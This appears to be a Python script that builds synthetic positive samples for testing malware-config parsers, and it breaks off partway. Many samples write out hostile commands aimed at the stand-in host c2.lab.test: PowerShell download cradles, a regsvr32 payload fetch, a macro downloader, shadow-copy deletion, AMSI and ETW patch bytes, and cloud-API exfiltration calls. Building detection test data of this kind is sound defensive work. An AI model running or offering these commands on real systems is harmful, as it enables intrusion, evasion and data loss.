#!/usr/bin/env python3
"""
Generate synthetic TP (True Positive) and FP (False Positive) test samples
for mwcp parser lab validation.

All samples are synthetic -- they embed the exact structural indicators each
parser uses for detection (binary structures, protocol field names, wire-format
patterns) but contain no actual malware.  Run this once before running the
parser tests; the pytest fixture auto-invokes it if samples are absent.

Usage:
    python generate_samples.py
"""
import base64
import hashlib
import json
import os
import struct

HERE = os.path.dirname(os.path.abspath(__file__))
TP = os.path.join(HERE, 'samples', 'tp')
FP = os.path.join(HERE, 'samples', 'fp')


def _write(path: str, data) -> None:
    if isinstance(data, str):
        data = data.encode('utf-8')
    with open(path, 'wb') as fh:
        fh.write(data)
    print(f'  {os.path.relpath(path, HERE)} ({len(data)} bytes)')


def _mz(payload: bytes, pad: int = 512) -> bytes:
    return b'MZ' + b'\x90' * (pad - 2) + payload


# ---------------------------------------------------------------------------
# TP: CobaltStrike
# XOR-encoded config block with all required structural fields.
# ---------------------------------------------------------------------------
def _tp_cobaltstrike() -> bytes:
    def s16(id_, val):
        return struct.pack('>HHH', id_, 1, 2) + struct.pack('>H', val)
    def s32(id_, val):
        return struct.pack('>HHH', id_, 2, 4) + struct.pack('>I', val)
    def sstr(id_, val):
        b = val.encode('utf-8') + b'\x00'
        return struct.pack('>HHH', id_, 3, len(b)) + b

    block = b''
    block += s16(1, 0)           # BeaconType: HTTP
    block += s16(2, 443)         # Port
    block += s32(3, 5000)        # SleepTime: 5000ms
    block += s16(5, 30)          # Jitter: 30%
    block += sstr(7, 'c2.lab.test,/gate.php')
    block += sstr(8, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
    block += sstr(11, '%windir%\\sysnative\\svchost.exe')
    block += sstr(50, '\\\\.\\pipe\\msagent_b4f7')
    block += struct.pack('>HHH', 0, 0, 0)  # end sentinel

    key = 0x69
    encoded = bytes(b ^ key for b in block)
    return _mz(b'\x00' * 256 + encoded)


# ---------------------------------------------------------------------------
# TP: Sliver
# Wire-protocol JSON fields + mtls:// transport scheme.
# ---------------------------------------------------------------------------
def _tp_sliver() -> bytes:
    config = {
        'implant_name': 'BLUE_PHANTOM',
        'c2s': [{'url': 'mtls://c2.lab.test:8888'}],
        'reconnect_interval': 60,
        'server_url': 'mtls://c2.lab.test:8888',
        'dns_c2s': [],
        'ActiveC2': 'mtls://c2.lab.test:8888',
        'MaxConnectionErrors': 1000,
        'PollTimeout': 360,
    }
    payload = json.dumps(config).encode('utf-8')
    payload += b'\x00"implant_name"\x00mtls://\x00'
    return _mz(b'\x00' * 256 + payload)


# ---------------------------------------------------------------------------
# TP: Havoc
# 0xDEADBEEF magic + valid config_size + C2 URL in config region.
# ---------------------------------------------------------------------------
def _tp_havoc() -> bytes:
    magic       = b'\xde\xad\xbe\xef'
    config_size = struct.pack('<I', 64)
    agent_id    = struct.pack('<I', 0xABCD1234)
    sleep       = struct.pack('<I', 5)
    jitter      = struct.pack('<I', 20)
    c2_region   = b'https://c2.lab.test/profile\x00' + b'\x00' * 32
    payload = magic + config_size + agent_id + sleep + jitter + c2_region
    return _mz(b'\x00' * 256 + payload)


# ---------------------------------------------------------------------------
# TP: BruteRatel
# Named pipe \\.\\pipe\\ratel (SMB C2 protocol-required).
# ---------------------------------------------------------------------------
def _tp_bruteratel() -> bytes:
    payload = (
        b'\x00' * 64 +
        b'\\\\.\\pipe\\ratel\x00' +
        b'https://c2.lab.test/badger_profile\x00' +
        b'\x00' * 32
    )
    return _mz(b'\x00' * 256 + payload)


# ---------------------------------------------------------------------------
# TP: Mythic
# PayloadUUID + callback_interval (2 required protocol field names).
# ---------------------------------------------------------------------------
def _tp_mythic() -> bytes:
    config = {
        'PayloadUUID': 'a1b2c3d4-e5f6-7890-abcd-ef1234567890',
        'callback_interval': 60,
        'callback_jitter': 23,
        'AES_PSK': 'LabTestAESKeyBase64=',
        'c2_profiles': [{'name': 'http', 'parameters': {
            'callback_host': 'http://c2.lab.test',
            'callback_port': 80,
        }}],
        'kill_date': '2099-12-31',
    }
    return _mz(b'\x00' * 256 + json.dumps(config).encode('utf-8'))


# ---------------------------------------------------------------------------
# TP: Merlin
# Wire-protocol JSON fields: "psk", "skew", "maxRetry", "proto", "padding"
# ---------------------------------------------------------------------------
def _tp_merlin() -> bytes:
    config = {
        'psk':      'LabTestPreSharedKey01234567890',
        'skew':     3000,
        'maxRetry': 7,
        'proto':    'https',
        'padding':  4096,
        'url':      'https://c2.lab.test/merlin',
        'ja3':      '769,47-53-5-10-49161-49162-49171-49172,0-10-11,23-24-25,0',
    }
    return _mz(b'\x00' * 256 + json.dumps(config).encode('utf-8'))


# ---------------------------------------------------------------------------
# TP: PoshC2 (PS1)
# $server + $URLS + $kill_date = 3 of the _POSH_MARKERS (need >= 2)
# ---------------------------------------------------------------------------
def _tp_posh_c2() -> bytes:
    return b"""\
$server = "https://c2.lab.test"
$URLS = @("/index.php", "/news.php", "/status.php")
$Payload = "IEX (New-Object Net.WebClient).DownloadString"
$PayloadComms = "$server/comms.php"
$kill_date = "2099-12-31"
$sleep_time = 5
$jitter_time = 0.2
$proxy_url = ""
$proxy_username = ""
$proxy_password = ""
"""


# ---------------------------------------------------------------------------
# TP: NjRAT
# Pipe-delimited plaintext config: host|port|key|name|campaign|
# ---------------------------------------------------------------------------
def _tp_njrat() -> bytes:
    config = b'c2.lab.test|4444|SOFTWARE\\Microsoft\\Windows|MutexABC|Campaign1|\x00'
    return _mz(b'\x00' * 256 + config)


# ---------------------------------------------------------------------------
# TP: AsyncRAT
# .NET string cluster: Hosts + Ports + Version + Mutex + Certificate +
#                       Group + Delay + Install + Anti + BDOS (>= 3 in 4KB)
# ---------------------------------------------------------------------------
def _tp_asyncrat() -> bytes:
    cluster = b''.join([
        b'Hosts\x00\x04c2.lab.test\x00',
        b'Ports\x00\x044444\x00',
        b'Version\x00\x040.5.8\x00',
        b'Mutex\x00\x04AsyncMutex_a8f3b2\x00',
        b'Certificate\x00\x04MIID_placeholder\x00',
        b'BDOS\x00\x04False\x00',
        b'Group\x00\x04TestTargets\x00',
        b'Delay\x00\x043000\x00',
        b'Install\x00\x04False\x00',
        b'Anti\x00\x04False\x00',
    ])
    return _mz(b'\x00' * 128 + cluster)


# ---------------------------------------------------------------------------
# TP: TelegramC2
# Bot token in exact Telegram API format: <8-10 digits>:<35 chars>
# ---------------------------------------------------------------------------
def _tp_telegram() -> bytes:
    token = b'1234567890:ABCDEFGHijklmnopqrstuvwxyz_abcde'
    return (
        b'bot_token = "' + token + b'"\n' +
        b'chat_id = -100987654321\n' +
        b'https://api.telegram.org/bot' + token + b'/sendMessage\n'
    )


# ---------------------------------------------------------------------------
# TP: SMTPExfil
# SMTP host + port + email + password all within 512 bytes
# ---------------------------------------------------------------------------
def _tp_smtp_exfil() -> bytes:
    payload = (
        b'\x00smtp.lab.test\x00'
        b'\x00587\x00'
        b'exfil@lab.test\x00'
        b'password:L4bP4ssw0rd\x00'
    )
    return _mz(b'\x00' * 128 + payload)


# ---------------------------------------------------------------------------
# TP: GenericMutex
# CreateMutexA API near a hex-token string (triggers both code paths)
# ---------------------------------------------------------------------------
def _tp_generic_mutex() -> bytes:
    payload = (
        b'\x00' * 64 +
        b'CreateMutexA\x00' +
        b'A1B2C3D4E5F6\x00' +     # 12-char hex token
        b'\x00' * 32
    )
    return _mz(b'\x00' * 256 + payload)


# ---------------------------------------------------------------------------
# TP: GenericC2
# Non-private IP:port and non-benign URL (TEST-NET-1 documentation range)
# ---------------------------------------------------------------------------
def _tp_generic_c2() -> bytes:
    payload = (
        b'http://192.0.2.1:4444/gate.php\x00'   # non-private IP
        b'192.0.2.1:4444\x00'
    )
    return _mz(b'\x00' * 128 + payload)


# ---------------------------------------------------------------------------
# TP: PowerShellDecoder
# -enc flag + valid base64-encoded UTF-16LE PowerShell command
# ---------------------------------------------------------------------------
def _tp_ps_decoder() -> bytes:
    ps_cmd = 'IEX (New-Object Net.WebClient).DownloadString("http://c2.lab.test/stg")'
    ps_b64 = base64.b64encode(ps_cmd.encode('utf-16-le')).decode('ascii')
    line = f'powershell.exe -NoProfile -WindowStyle Hidden -enc {ps_b64}\n'
    return line.encode('utf-8')


# ---------------------------------------------------------------------------
# TP: LNKParser
# Minimal valid MS-SHLLINK file with COMMAND_LINE_ARGUMENTS containing a URL.
# ---------------------------------------------------------------------------
def _tp_lnk() -> bytes:
    # Header (76 bytes per MS-SHLLINK spec)
    # link_flags: HasStringData (bit2) + IsUnicode (bit7) + HasArguments (bit11)
    # = 0x04 | 0x80 | 0x800 = 0x884
    header = struct.pack('<I', 0x4C)                                          # HeaderSize
    header += b'\x01\x14\x02\x00\x00\x00\x00\x00\xc0\x00\x00\x00\x00\x00\x00\x46'  # LinkCLSID
    header += struct.pack('<I', 0x884)                                        # LinkFlags
    header += struct.pack('<I', 0x20)                                         # FileAttributes
    header += b'\x00' * 24                                                    # 3x FILETIME
    header += struct.pack('<I', 0)                                            # FileSize
    header += struct.pack('<I', 0)                                            # IconIndex
    header += struct.pack('<I', 1)                                            # ShowCommand
    header += b'\x00' * 2                                                     # HotKey
    header += b'\x00' * 2                                                     # Reserved1
    header += b'\x00' * 4                                                     # Reserved2
    header += b'\x00' * 4                                                     # Reserved3
    assert len(header) == 76

    # StringData: COMMAND_LINE_ARGUMENTS (Unicode, count = number of chars)
    args = 'powershell.exe -NoProfile -WindowStyle Hidden -c "IEX (New-Object Net.WebClient).DownloadString(\'http://c2.lab.test/payload\')"'
    args_utf16 = args.encode('utf-16-le')
    count = len(args)          # number of characters, NOT bytes
    string_data = struct.pack('<H', count) + args_utf16

    return header + string_data


# ---------------------------------------------------------------------------
# TP: DiscordExfilConfig
# Webhook URL in exact Discord API format: /api/webhooks/<snowflake>/<token>
# ---------------------------------------------------------------------------
def _tp_discord() -> bytes:
    # Server ID: Discord Snowflake (18 digits); token: 68 alphanumeric chars
    webhook = (b'https://discord.com/api/webhooks/123456789012345678/'
               b'LabTestWebhookTokenABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghij')
    return (
        b'# Exfil config\n'
        b'webhook_url = "' + webhook + b'"\n'
        b'chat_id = 987654321\n'
    )


# ---------------------------------------------------------------------------
# TP: DcRATConfig
# AsyncRAT base cluster + HVNC + Serversignature (DcRAT-specific markers)
# ---------------------------------------------------------------------------
def _tp_dcrat() -> bytes:
    cluster = b''.join([
        b'Hosts\x00\x04c2.lab.test\x00',
        b'Ports\x00\x044444\x00',
        b'Version\x00\x041.0.7\x00',
        b'Mutex\x00\x04DcMutex_LabTest\x00',
        b'Certificate\x00\x04MIID_lab_cert\x00',
        b'HVNC\x00\x04True\x00',
        b'Serversignature\x00\x04LabServerSig2024ABCDEFGH==\x00',
        b'Group\x00\x04LabCampaign\x00',
        b'Delay\x00\x043000\x00',
        b'Install\x00\x04False\x00',
        b'Anti\x00\x04False\x00',
    ])
    return _mz(b'\x00' * 128 + cluster)


# ---------------------------------------------------------------------------
# TP: XWormConfig
# "XWorm V5.6" marker + key cluster with XWorm-specific field names
# ---------------------------------------------------------------------------
def _tp_xworm() -> bytes:
    cluster = b''.join([
        b'XWorm V5.6\x00',
        b'Hosts\x00\x04c2.lab.test\x00',
        b'Ports\x00\x044444\x00',
        b'Ver\x00\x045.6\x00',
        b'Mutex\x00\x04XWormMutex_LabTest\x00',
        b'BSOD\x00\x04False\x00',
        b'Hwid\x00\x04LAB-HWID-001\x00',
        b'Group\x00\x04XWormLab\x00',
        b'Delay\x00\x043000\x00',
        b'Pastebin\x00\x04null\x00',
    ])
    return _mz(b'\x00' * 128 + cluster)


# ---------------------------------------------------------------------------
# TP: QuasarRATConfig
# Port (singular, not Ports) + Password + Tag cluster = Quasar fingerprint
# ---------------------------------------------------------------------------
def _tp_quasarrat() -> bytes:
    cluster = b''.join([
        b'Hosts\x00\x04c2.lab.test\x00',
        b'Port\x00\x044444\x00',       # singular -- DcRAT/AsyncRAT use "Ports"
        b'Password\x00\x04QuasarLabPass2024!\x00',
        b'Mutex\x00\x04{A1B2C3D4-E5F6-7890-ABCD-EF1234567890}\x00',
        b'Tag\x00\x04LabTarget\x00',
        b'ShowConsole\x00\x04False\x00',
        b'LogDirectoryName\x00\x04Logs\x00',
        b'Version\x00\x041.3.0.0\x00',
    ])
    return _mz(b'\x00' * 128 + cluster)


# ---------------------------------------------------------------------------
# TP: AgentTeslaConfig
# "Agent Tesla" product string + keylogger import + SMTP exfil config
# ---------------------------------------------------------------------------
def _tp_agenttesla() -> bytes:
    payload = b''.join([
        b'Agent Tesla\x00',
        b'GetKeyboardState\x00',
        b'ProductionModeKey\x00',
        b'smtp.lab.test\x00',
        b'587\x00',
        b'from@lab.test\x00',
        b'to@analyst.test\x00',
        b'password:ATLabPass2024!\x00',
    ])
    return _mz(b'\x00' * 256 + payload)


# ---------------------------------------------------------------------------
# TP: AdaptixC2Config
# JSON with agent_id + callback_url + profile (Adaptix protocol-required)
# ---------------------------------------------------------------------------
def _tp_adaptix() -> bytes:
    config = json.dumps({
        'agent_id':         'AABBCCDD11223344',
        'callback_url':     'https://c2.lab.test/adaptix',
        'profile':          'http-adaptix-profile',
        'callback_interval': 30,
        'callback_jitter':  10,
    }).encode('utf-8')
    return _mz(b'\x00' * 256 + config)


# ---------------------------------------------------------------------------
# TP: PowGratConfig (PS1)
# $C2Server + $C2Port + $Password variable cluster
# ---------------------------------------------------------------------------
def _tp_powgrat() -> bytes:
    return b"""\
$C2Server = "https://c2.lab.test"
$C2Port = "443"
$Password = "PowGratLabPass2024"
$SleepTime = 5
$Jitter = 0.2
"""


def _rc4(key: bytes, data: bytes) -> bytes:
    s = list(range(256))
    j = 0
    klen = len(key)
    for i in range(256):
        j = (j + s[i] + key[i % klen]) % 256
        s[i], s[j] = s[j], s[i]
    out = bytearray(len(data))
    i = j = 0
    for n in range(len(data)):
        i = (i + 1) % 256
        j = (j + s[i]) % 256
        s[i], s[j] = s[j], s[i]
        out[n] = data[n] ^ s[(s[i] + s[j]) % 256]
    return bytes(out)


def _minimal_pe_with_overlay(overlay: bytes) -> bytes:
    """Build a minimal-but-structurally-valid PE (proper e_lfanew, PE sig,
    one section with a real SizeOfRawData/PointerToRawData) so the overlay-
    extraction logic shared by IcedIDConfig/VidarConfig/LummaConfig/
    RaccoonConfig locates *overlay* as exactly the bytes appended here."""
    e_lfanew = 0x80
    opt_hdr_size = 0xE0
    section_raw_size = 512
    sec_table_off = e_lfanew + 24 + opt_hdr_size
    raw_ptr = sec_table_off + 40
    max_end = raw_ptr + section_raw_size

    buf = bytearray(max_end)
    buf[0:2] = b'MZ'
    struct.pack_into('<I', buf, 0x3C, e_lfanew)
    buf[e_lfanew:e_lfanew + 4] = b'PE\x00\x00'
    struct.pack_into('<H', buf, e_lfanew + 4, 0x8664)       # Machine
    struct.pack_into('<H', buf, e_lfanew + 6, 1)             # NumberOfSections
    struct.pack_into('<H', buf, e_lfanew + 20, opt_hdr_size) # SizeOfOptionalHeader
    buf[sec_table_off:sec_table_off + 5] = b'.text'
    struct.pack_into('<I', buf, sec_table_off + 16, section_raw_size)  # SizeOfRawData
    struct.pack_into('<I', buf, sec_table_off + 20, raw_ptr)           # PointerToRawData
    return bytes(buf) + overlay


# ---------------------------------------------------------------------------
# TP: DeimosConfig
# JSON wire-protocol fields (CallbackURL/AgentID/Interval/PubKey)
# ---------------------------------------------------------------------------
def _tp_deimos() -> bytes:
    config = json.dumps({
        'CallbackURL': 'https://c2.lab.test/checkin',
        'AgentID':     'DEIMOS-LAB-001',
        'Interval':    30,
        'PubKey':      '-----BEGIN PUBLIC KEY-----LABKEYDATA-----END PUBLIC KEY-----',
    }).encode('utf-8')
    return _mz(b'\x00' * 128 + config)


# ---------------------------------------------------------------------------
# TP: MacroPackConfig
# Auto-exec entry + Chr()-loop reconstruction + WScript.Shell shell-out
# ---------------------------------------------------------------------------
def _tp_macropack() -> bytes:
    return b"""\
Sub AutoOpen()
    Dim s As String
    s = Chr(104) & Chr(116) & Chr(116) & Chr(112) & Chr(58) & Chr(47) & Chr(47)
    s = s & "c2.lab.test/payload"
    CreateObject("WScript.Shell").Run s
End Sub
"""


# ---------------------------------------------------------------------------
# TP: IcedIDConfig
# RC4-encrypted (key-prefixed) domain list in the PE overlay, sized so the
# full blob is one contiguous decode candidate.
# ---------------------------------------------------------------------------
def _tp_icedid() -> bytes:
    key = b'IK4LAB01'                      # 8 bytes
    plain = b'c2a.lab.test\x00c2b.lab.test\x00' + b'\x00' * 30   # 56 bytes
    cipher = _rc4(key, plain)
    blob = key + cipher                    # 64 bytes total
    return _minimal_pe_with_overlay(blob)


# ---------------------------------------------------------------------------
# TP: QakBotConfig / EmotedConfig
# XOR-encoded, fixed 8-byte [ip4][port2][flags2] record array.
# ---------------------------------------------------------------------------
def _xor_ip_records(n: int, key: int, start_octet3: int = 0) -> bytes:
    out = b''
    for i in range(n):
        rec = bytes((203, 0, start_octet3, (i % 250) + 1)) + struct.pack('<H', 443) + b'\x00\x00'
        out += bytes(b ^ key for b in rec)
    return out


def _tp_qakbot() -> bytes:
    return b'\x00' * 8 + _xor_ip_records(6, 0x5A, start_octet3=113)


def _tp_emoted() -> bytes:
    return b'\x00' * 8 + _xor_ip_records(10, 0x37, start_octet3=114)


# ---------------------------------------------------------------------------
# TP: RemcosConfig
# UTF-16LE "SETTINGS" resource-name marker + RC4-encrypted (key-prefixed)
# semicolon-delimited field list.
# ---------------------------------------------------------------------------
def _tp_remcos() -> bytes:
    settings_marker = 'SETTINGS'.encode('utf-16-le')
    fields = ['c2.lab.test', '4443', 'RemcosLabPass2024', 'LabLicenseKey',
              '0', '0', '1', '0']
    plain = ';'.join(fields).encode('ascii')
    key = b'RC4KEY01'
    cipher = _rc4(key, plain)
    blob = key + cipher
    return settings_marker + blob


# ---------------------------------------------------------------------------
# TP: NanoCoreConfig
# .NET deserializer field-name cluster (BuildTime/Mutex/Group/
# RunOnStartup/ConnectionPort/PrimaryConnectionHost)
# ---------------------------------------------------------------------------
def _tp_nanocore() -> bytes:
    cluster = b''.join([
        b'BuildTime\x0401/01/2024\x00',
        b'Mutex\x04NanoCoreMutexLab2024\x00',
        b'Group\x04NanoLabGroup\x00',
        b'RunOnStartup\x04True\x00',
        b'RequestElevation\x04True\x00',
        b'ConnectionPort\x044443\x00',
        b'PrimaryConnectionHost\x04c2.lab.test\x00',
        b'KeepAliveTimeout\x0430000\x00',
    ])
    return _mz(b'\x00' * 128 + cluster)


# ---------------------------------------------------------------------------
# TP: RedlineConfig
# base64-encoded XML config with 2+ child elements + embedded IP:port
# ---------------------------------------------------------------------------
def _tp_redline() -> bytes:
    xml = b'<Config><Host>1.2.3.4:8080</Host><Key>LabKey123</Key></Config>'
    b64 = base64.b64encode(xml)
    return _mz(b'\x00' * 128 + b64 + b'\x00' * 32)


# ---------------------------------------------------------------------------
# TP: VidarConfig
# Plaintext (low-entropy) URL directly in the PE overlay
# ---------------------------------------------------------------------------
def _tp_vidar() -> bytes:
    overlay = b'http://c2.lab.test/gate\x00' * 4
    return _minimal_pe_with_overlay(overlay)


# ---------------------------------------------------------------------------
# TP: LummaConfig
# 2+ NUL-separated base64-encoded C2 URLs in the PE overlay
# ---------------------------------------------------------------------------
def _tp_lumma() -> bytes:
    url1 = base64.b64encode(b'https://c2a.lab.test/api')
    url2 = base64.b64encode(b'https://c2b.lab.test/api')
    overlay = url1 + b'\x00' + url2 + b'\x00'
    return _minimal_pe_with_overlay(overlay)


# ---------------------------------------------------------------------------
# TP: StealcConfig
# C2 URL immediately adjacent to the required POST Content-Type header
# ---------------------------------------------------------------------------
def _tp_stealc() -> bytes:
    return (b'Content-Type: application/x-www-form-urlencoded\r\n'
            b'http://c2.lab.test/gate.php\r\n'
            b'SELECT origin_url, username_value, password_value FROM logins\x00')


# ---------------------------------------------------------------------------
# TP: RaccoonConfig
# v2 Telegram Bot API fallback URL pattern
# ---------------------------------------------------------------------------
def _tp_raccoon() -> bytes:
    return b'\x00' * 40 + b'api.telegram.org/bot123456789:AAExampleLabTokenForTesting12345' + b'\x00' * 40


def _tp_raccoon_v1() -> bytes:
    overlay = (b'http://c2.lab.test/gate\x00' * 2 +
               b'SELECT origin_url, username_value, password_value FROM logins\x00')
    return _minimal_pe_with_overlay(overlay)


def _rsa_pubkey_der(modulus_len: int = 256) -> bytes:
    """Minimal ASN.1 DER RSA public key block: SEQUENCE(INTEGER modulus,
    INTEGER 65537) shaped closely enough for the ransomware parsers'
    structural regex (SEQUENCE/INTEGER tags + the 65537 exponent), not a
    fully spec-compliant key."""
    modulus = bytes((i % 256) or 1 for i in range(modulus_len))
    inner = b'\x02\x82' + len(modulus).to_bytes(2, 'big') + modulus
    inner += b'\x02\x03\x01\x00\x01'   # exponent 65537
    return b'\x30\x82' + len(inner).to_bytes(2, 'big') + inner


# ---------------------------------------------------------------------------
# TP: RansomwareIndicators
# RSA pubkey DER block + VSS deletion command (2 of 3 shared signals)
# ---------------------------------------------------------------------------
def _tp_ransomware_indicators() -> bytes:
    return (_rsa_pubkey_der() +
            b'\x00cmd.exe /c vssadmin.exe delete shadows /all /quiet\x00')


# ---------------------------------------------------------------------------
# TP: LockBitConfig
# 4+ leaked-builder JSON field names
# ---------------------------------------------------------------------------
def _tp_lockbit() -> bytes:
    config = {
        'encrypt_filename': True,
        'kill_processes': ['sql.exe', 'agntsvc.exe', 'outlook.exe'],
        'local_disks': True,
        'network_disks': True,
        'note_full_paths': ['C:\\Users\\Public\\LabNote.txt'],
        'anti_debug': True,
    }
    return _mz(b'\x00' * 128 + json.dumps(config).encode('utf-8'))


# ---------------------------------------------------------------------------
# TP: BlackCatConfig
# 4+ BlackCat/ALPHV JSON schema field names
# ---------------------------------------------------------------------------
def _tp_blackcat() -> bytes:
    config = {
        'config_id': 'lab-affiliate-001',
        'public_key': 'LabTestPubKeyBase64==',
        'extension': 'labcat',
        'note_file_name': 'RECOVER-LABCAT-FILES.txt',
        'kill_processes': ['sql.exe', 'veeam.exe'],
        'exclude_directory_names': ['Windows', 'Program Files'],
    }
    return json.dumps(config).encode('utf-8')


# ---------------------------------------------------------------------------
# TP: REvil_SodinokibiConfig
# 4+ short-key JSON schema fields
# ---------------------------------------------------------------------------
def _tp_revil() -> bytes:
    config = {
        'pk': 'LabTestPublicKeyBase64==',
        'pid': 'lab-campaign-01',
        'sub': 'lab-sub-01',
        'dbg': False,
        'nname': 'lab-readme.txt',
        'net': False,
    }
    return json.dumps(config).encode('utf-8')


# ---------------------------------------------------------------------------
# TP: ContiConfig
# Leaked-source argument schema: -m mode + another flag together
# ---------------------------------------------------------------------------
def _tp_conti() -> bytes:
    return b'conti.exe -p C:\\ -m local -size 10485760 -nomutex -log C:\\lab.log\x00'


# ---------------------------------------------------------------------------
# TP: AkiraConfig
# --encryption_percent + a sibling flag from the same schema
# ---------------------------------------------------------------------------
def _tp_akira() -> bytes:
    return b'akira.exe --encryption_percent 50 --encryption_path C:\\ --share_file \\\\srv\\share\x00'


# ---------------------------------------------------------------------------
# TP: BlackBastaConfig
# Required -key argument + a shared ransomware structural marker (RSA pubkey)
# ---------------------------------------------------------------------------
def _tp_blackbasta() -> bytes:
    key = base64.b64encode(b'LabTestBlackBastaRuntimeKeyMaterial1234567890')
    return _rsa_pubkey_der() + b'\x00-key ' + key + b'\x00'


# ---------------------------------------------------------------------------
# TP: WMIPersistenceConfig
# WQL trigger clause + consumer payload field together
# ---------------------------------------------------------------------------
def _tp_wmi_persistence() -> bytes:
    return (b'SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE '
            b'TargetInstance ISA "Win32_Process"\x00'
            b'CommandLineTemplate=powershell.exe -w hidden -enc BASE64PAYLOAD\x00')


# ---------------------------------------------------------------------------
# TP: ScheduledTaskConfig
# <Exec> action with BOTH hidden-window AND encoded-command flags
# ---------------------------------------------------------------------------
def _tp_scheduled_task() -> bytes:
    return (b'<Task><Actions><Exec><Command>powershell.exe</Command>'
            b'<Arguments>-WindowStyle Hidden -EncodedCommand BASE64PAYLOADHERE</Arguments>'
            b'</Exec></Actions></Task>')


# ---------------------------------------------------------------------------
# TP: RegistryPersistenceConfig
# Run key path + staging-directory-shaped value together
# ---------------------------------------------------------------------------
def _tp_registry_persistence() -> bytes:
    return (b'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\x00'
            b'C:\\Users\\LabUser\\AppData\\Local\\Temp\\svchost_updater.exe\x00')


# ---------------------------------------------------------------------------
# TP: DefenderExclusionConfig
# Add-MpPreference -ExclusionPath targeting a staging directory
# ---------------------------------------------------------------------------
def _tp_defender_exclusion() -> bytes:
    return b'Add-MpPreference -ExclusionPath "C:\\Users\\LabUser\\AppData\\Local\\Temp\\stage"\x00'


# ---------------------------------------------------------------------------
# TP: AMSIPatchConfig
# E_INVALIDARG patch bytes near "AmsiScanBuffer"
# ---------------------------------------------------------------------------
def _tp_amsi_patch() -> bytes:
    return (b'\x00' * 32 + b'AmsiScanBuffer' + b'\x00' * 16 +
            bytes.fromhex('B8570007' '80C3') + b'\x00' * 32)


# ---------------------------------------------------------------------------
# TP: ETWPatchConfig
# No-op patch bytes near "EtwEventWrite"
# ---------------------------------------------------------------------------
def _tp_etw_patch() -> bytes:
    return (b'\x00' * 16 + b'EtwEventWrite' + bytes.fromhex('33C0C3') + b'\x00' * 16)


# ---------------------------------------------------------------------------
# TP: COMHijackConfig
# CLSID\InProcServer32 + staging-directory DLL path together
# ---------------------------------------------------------------------------
def _tp_com_hijack() -> bytes:
    return (b'CLSID\\{12345678-1234-1234-1234-1234567890AB}\\InProcServer32\x00'
            b'C:\\Users\\LabUser\\AppData\\Local\\Temp\\hijack.dll\x00')


# ---------------------------------------------------------------------------
# TP: Delivery mechanisms
# ---------------------------------------------------------------------------

def _tp_macro_downloader() -> bytes:
    return (b'Sub Document_Open()\n'
            b'Declare PtrSafe Function URLDownloadToFileA Lib "urlmon" '
            b'(ByVal a As Long, ByVal b As String, ByVal c As String, '
            b'ByVal d As Long, ByVal e As Long) As Long\n'
            b'x = URLDownloadToFileA(0, "http://c2.lab.test/payload.exe", "out.exe", 0, 0)\n'
            b'End Sub\n')


def _tp_iso_lnk_chain() -> bytes:
    lnk_header = (b'\x4c\x00\x00\x00' +
                  b'\x01\x14\x02\x00\x00\x00\x00\x00\xc0\x00\x00\x00\x00\x00\x00\x46')
    data = bytearray(b'\x00' * 40000)
    data[32769:32774] = b'CD001'
    data[35000:35000 + len(lnk_header)] = lnk_header
    return bytes(data)


def _tp_html_smuggling() -> bytes:
    b64_blob = base64.b64encode(b'\x4d\x5a' + b'\x90' * 6000).decode('ascii').encode('ascii')
    return (b'<html><body><script>\n'
            b'var bytes = [' + b64_blob + b'];\n'
            b'var blob = new Blob([bytes], {type: "application/octet-stream"});\n'
            b'navigator.msSaveOrOpenBlob(blob, "invoice.exe");\n'
            b'</script></body></html>')


def _tp_onenote_embed() -> bytes:
    one_header = bytes([0xE4, 0x52, 0x5C, 0x7B, 0x8C, 0xD8, 0xA7, 0x4D,
                         0xAE, 0xB1, 0x53, 0x78, 0xD0, 0x29, 0x96, 0xD3])
    fds_guid = bytes([0xE7, 0x16, 0xE3, 0xBD, 0x65, 0x26, 0x11, 0x45,
                       0xA4, 0xC4, 0x8D, 0x4D, 0x0B, 0x7A, 0x9E, 0xAC])
    return one_header + b'\x00' * 40 + fds_guid + b'invoice_details.exe\x00' + b'\x00' * 100


def _tp_mshta_cradle() -> bytes:
    return (b'<hta:application id="app" applicationname="update"/>\n'
            b'<script language="VBScript">\n'
            b'Set x = CreateObject("Msxml2.ServerXMLHTTP")\n'
            b'x.Open "GET", "http://c2.lab.test/stage2.ps1", False\n'
            b'x.Send\n'
            b'</script>\n')


def _tp_wsf_polyglot() -> bytes:
    return (b'<job id="main">\n'
            b'<script language="VBScript">\n'
            b'Set sh = CreateObject("WScript.Shell")\n'
            b'sh.Run("powershell -enc AAAA")\n'
            b'</script>\n'
            b'<script language="JScript">\n'
            b'var x = 1;\n'
            b'</script>\n'
            b'</job>\n')


def _tp_regsvr_squiblydoo() -> bytes:
    return b'regsvr32.exe /s /n /i:http://c2.lab.test/payload.sct scrobj.dll\n'


# ---------------------------------------------------------------------------
# TP: Cloud/SaaS C2
# ---------------------------------------------------------------------------

def _tp_slack_c2() -> bytes:
    return (b'$token = "xoxb-1234567890-1234567890-abcdefghijklmnopqrstuvwx"\n'
            b'Invoke-RestMethod -Uri "https://slack.com/api/chat.postMessage" '
            b'-Headers @{Authorization="Bearer $token"}\n')


def _tp_teams_c2() -> bytes:
    return (b'$uri = "https://contoso.webhook.office.com/webhookb2/'
            b'11111111-2222-3333-4444-555555555555@tenant/IncomingWebhook/abcdef/12345"\n'
            b'$body = \'{"@type":"MessageCard","@context":"http://schema.org/extensions",'
            b'"text":"beacon"}\'\n'
            b'Invoke-RestMethod -Uri $uri -Method Post -Body $body\n')


def _tp_googlesheet_c2() -> bytes:
    return (b'$sheet = "https://sheets.googleapis.com/v4/spreadsheets/1a2b3c4d5e6f7g8h9i"\n'
            b'$key = "AIzaSyD1234567890abcdefghijklmnopqrstuv"\n'
            b'Invoke-RestMethod -Uri "$sheet/values/A1?key=$key"\n')


def _tp_dropbox_c2() -> bytes:
    return (b'$uri = "https://content.dropboxapi.com/2/files/upload"\n'
            b'Invoke-RestMethod -Uri $uri -Headers @{'
            b'"Dropbox-API-Arg" = \'{"path":"/exfil.zip","mode":"add"}\'} -Method Post\n')


def _tp_github_c2() -> bytes:
    return (b'$token = "ghp_' + b'A' * 36 + b'"\n'
            b'Invoke-RestMethod -Uri "https://api.github.com/gists" '
            b'-Headers @{Authorization="token $token"} -Method Post\n')


def _tp_pastebin_c2() -> bytes:
